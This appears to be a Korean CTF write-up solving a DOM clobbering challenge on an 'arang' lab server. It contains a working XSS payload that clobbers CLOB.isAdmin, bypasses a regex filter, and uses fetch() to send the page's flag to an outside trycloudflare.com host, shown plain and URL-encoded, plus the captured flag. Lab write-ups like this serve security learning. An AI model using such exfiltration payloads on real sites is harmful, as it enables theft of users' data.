## DOM Clobbering

```python
if(preg_match("/script|on|frame|object|embed|data|&#|src|\\/\\/|'|\"|`|\\*/",$t)) return "";
```

입력 값을 필터링 하고 있음을 알 수있다.

```python
if(CLOB.isAdmin){ params = new URLSearchParams(location.search); eval(params.get("c")); }
```

CLOB.isAdmin이 참이면 입력 값을 실행하고 있음을 알 수 있다.

```python
http://edu.arang.kr:9107/?c=/<form%20id=CLOB><input%20id=isAdmin>/,alert(1)
```

위 조건들을 맞춰 alert를 띄우는 url을 전송해 보았다.

![](images/12.png)

alert 명령어가 제대로 작동함을 알 수 있다. 

필터를 우회하기 위해 _=String.fromCharCode(0x2f) 구문을 이용해 _를 /로 치환되도록 하였고 “ ”부분을 만들기 위해 정규식 리터럴과 .source를 이용하였다. 

```python
http://domclobbering:9107/?c=/<form id=CLOB><input id=isAdmin>/;_=String.fromCharCode(0x2f);fetch(/https:/.source%2B_%2B_%2B/advertise-lasting-recipient-stop.trycloudflare.com?flag=/.source%2Bflag.innerText)
```

이와 같은 페이로드 구성이 가능하고 이를 인코딩해서 report를 날려보았다.

```python
http://domclobbering:9107/?c=%2F%3Cform%20id%3DCLOB%3E%3Cinput%20id%3DisAdmin%3E%2F%3B_%3DString.fromCharCode(0x2f)%3Bfetch(%2Fhttps%3A%2F.source%2B_%2B_%2B%2Fadvertise-lasting-recipient-stop.trycloudflare.com%3Fflag%3D%2F.source%2Bflag.innerText)
```

![](images/13.png)

flag{f3550bc793662a2bd2e3} flag획득이 가능하였다.
